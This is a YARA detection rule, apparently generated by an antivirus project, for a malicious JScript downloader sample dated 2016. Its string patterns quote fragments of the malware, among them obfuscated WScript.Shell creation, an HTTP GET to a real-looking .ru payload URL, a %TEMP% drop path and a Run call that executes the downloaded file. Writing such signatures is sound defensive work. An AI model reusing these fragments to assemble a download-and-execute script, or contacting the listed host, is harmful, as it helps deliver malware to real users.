rule sig_20160427_1d6c2a8364ca2679e7425d6b67990ce2 {
  meta:
    description = "datamaliciousorder - file 20160427_1d6c2a8364ca2679e7425d6b67990ce2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5f822f398fdedcd46afa86faf049bf13b76cde580e8c9b7745a9ab418766f5dc"

  strings:
    $s1  = "function BmnxvVxstj() {return YywnfMqntq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"mpOMtpr" ascii
    $s2  = "function BmnxvVxstj() {return YywnfMqntq[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"mpOMtpr" ascii
    $s3  = "var YywnfMqntq = function LjuxkQvbfv() {return VyatqLtopf[QtisyLdwtk](\"WScript\"+\".Shell\");}(), NypjrYlubj = 11;" fullword ascii
    $s4  = "function LuqpuRidte(XiqucTaphv, ByiwiCwoqz){HhwogDeygl = HhwogDeygl * 1; return XiqucTaphv - ByiwiCwoqz;};" fullword ascii
    $s5  = "KwjvqFrrzf[WpahjHomdc](\"G\" + \"ET\", \"http://mavrinscorporation.ru/hd7fs\", false);" fullword ascii
    $s6  = "var VyatqLtopf = this[\"WScript\"];" fullword ascii
    $s7  = "function EktufGezmo(){return QdrueTevzp + \"\";};" fullword ascii
    $s8  = "if (KwjvqFrrzf[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s9  = "function TlqkbZcqnx() {return ((QeculZkxfh == true) && (QeculZkxfh == WczmkBveik)) ? 1 : HhwogDeygl;};" fullword ascii
    $s10 = "var CmwswHixij = false;" fullword ascii
    $s11 = "function CcpemInioz(){return QtisyLdwtk;};" fullword ascii
    $s12 = "function TsbvrTnvbz(FsuhxXhitf){YywnfMqntq[\"R\"+\"un\"](FsuhxXhitf, HhwogDeygl, HhwogDeygl);};" fullword ascii
    $s13 = "WczmkBveik = true; " fullword ascii
    $s14 = "return LuqpuRidte(NgsxhPrgmg, UgnkvInjei);" fullword ascii
    $s15 = "}while (SfghgVaalg);" fullword ascii
    $s16 = "CmwswHixij = true;" fullword ascii
    $s17 = "function TdpdwAxdno(HsnjhTufdn) {var IxdjjXclab = (1, 2, 3, 4, 5, HsnjhTufdn); return IxdjjXclab;};" fullword ascii
    $s18 = "QeculZkxfh = true; " fullword ascii
    $s19 = "var PlfizCkjzv = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "var QeculZkxfh = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}